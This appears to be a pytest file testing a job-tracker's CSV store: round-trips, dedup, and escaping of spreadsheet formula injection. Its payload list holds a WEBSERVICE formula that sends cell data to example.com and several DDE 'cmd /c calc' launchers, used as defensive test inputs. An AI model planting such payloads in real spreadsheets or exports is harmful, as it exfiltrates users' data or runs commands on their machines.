"""Data store round-trips + dedup, against a temp CSV directory.

Also pins the one rule the CSV writer owes the user: `data/jobs.csv` is not just our
storage format, it is a file `docs/manual/edit-data.md` tells people to open in a
spreadsheet. `company`, `position` and `location` reach a row verbatim from a job board,
and a spreadsheet reads a leading `=`, `+`, `-` or `@` as "evaluate me" — `csv` quotes
such a cell but quoting is not neutralising. So the writer marks those values as text,
and the escape has to be STABLE: every save rewrites every row, so an escape that isn't
idempotent would grow an apostrophe per save until the value is unrecognisable.
"""
import csv
from datetime import date

import pytest

from app import config
from app import data_store as store
from app.schemas import Application, Job


@pytest.fixture
def tmp_store(tmp_path, monkeypatch):
    monkeypatch.setattr(config, "JOBS_CSV", tmp_path / "jobs.csv")
    monkeypatch.setattr(config, "APPLICATIONS_CSV", tmp_path / "applications.csv")
    monkeypatch.setattr(config, "JOBS_DIR", tmp_path / "jobs")
    return store


def test_job_roundtrip_and_dedup(tmp_store):
    yr = date.today().year
    assert tmp_store.list_jobs() == []

    tmp_store.upsert_job(Job(id=f"{yr}-001", company="Acme", company_job_id="R1", position="Eng"))
    jobs = tmp_store.list_jobs()
    assert len(jobs) == 1 and jobs[0].company == "Acme"

    # dedup key is company + company_job_id, case-insensitive
    assert tmp_store.find_job_by_key("acme", "r1").id == f"{yr}-001"
    assert tmp_store.find_job_by_key("acme", "nope") is None
    # next surrogate id increments within the year
    assert tmp_store.next_job_id() == f"{yr}-002"


def test_application_roundtrip(tmp_store):
    tmp_store.upsert_application(
        Application(id="2026-001", company="Acme", company_job_id="R1", position="Eng", notes="call went well")
    )
    apps = tmp_store.list_applications()
    assert len(apps) == 1 and apps[0].notes == "call went well"
    assert tmp_store.get_application("2026-001").company == "Acme"
    assert tmp_store.get_application("missing") is None


def test_targets_roundtrip(tmp_store, tmp_path, monkeypatch):
    monkeypatch.setattr(config, "PROFILE_YML", tmp_path / "profile.yml")
    tmp_store.write_targets({"roles": ["Backend"], "work_mode": "remote"})
    assert tmp_store.read_targets() == {"roles": ["Backend"], "work_mode": "remote"}


# --- spreadsheet formula injection ------------------------------------------------
# The payloads below are the two that matter: one exfiltrates the cell's neighbours over
# HTTP the moment the sheet opens, the other is the classic DDE command launcher.
_FORMULA_PAYLOADS = [
    '=WEBSERVICE("https://example.com/?x="&A1)',
    '+cmd|\'/c calc\'!A0',
    '-2+3+cmd|\' /c calc\'!A0',
    '@SUM(1+9)*cmd|\' /c calc\'!A0',
]


@pytest.mark.parametrize("payload", _FORMULA_PAYLOADS)
def test_a_board_supplied_title_cannot_become_a_spreadsheet_formula(tmp_store, tmp_path, payload):
    tmp_store.upsert_job(
        Job(id="2026-001", company="Acme", company_job_id="R1", position=payload, location=payload)
    )
    # what the SPREADSHEET sees: no parsed cell may start with a formula lead
    with (tmp_path / "jobs.csv").open(newline="", encoding="utf-8") as f:
        for row in list(csv.reader(f))[1:]:
            for cell in row:
                assert cell[:1] not in ("=", "+", "-", "@")

    back = tmp_store.list_jobs()[0]  # ...and the value is still THERE, just marked as text
    assert back.position == "'" + payload and back.location == "'" + payload


def test_the_formula_escape_does_not_grow_on_every_save(tmp_store, tmp_path):
    """Every mutation rewrites every row. An escape that re-applies to its own output
    would add an apostrophe per save, and the user's job title would rot in place."""
    tmp_store.upsert_job(Job(id="2026-001", company="Acme", company_job_id="R1", position="=cmd"))
    once = tmp_store.list_jobs()[0].position

    for _ in range(3):  # three more read-modify-write cycles over the same row
        tmp_store.upsert_job(tmp_store.list_jobs()[0])

    assert tmp_store.list_jobs()[0].position == once == "'=cmd"


def test_a_negative_number_is_never_apostrophised(tmp_store):
    """`-` is a formula lead, and salary/fit columns are read back with float(). Escaping
    a numeric cell would make the next list_jobs() raise instead of returning a row."""
    tmp_store.upsert_job(
        Job(id="2026-001", company="Acme", company_job_id="R1", position="Eng",
            salary_min=-1.0, fit_score=-0.5)
    )
    back = tmp_store.list_jobs()[0]
    assert back.salary_min == -1.0 and back.fit_score == -0.5


def test_an_ordinary_title_is_left_exactly_as_typed(tmp_store):
    tmp_store.upsert_job(
        Job(id="2026-001", company="Initech", company_job_id="R1", position="Engineer (C++)",
            location="Toronto, ON")
    )
    back = tmp_store.list_jobs()[0]
    assert back.position == "Engineer (C++)" and back.location == "Toronto, ON"
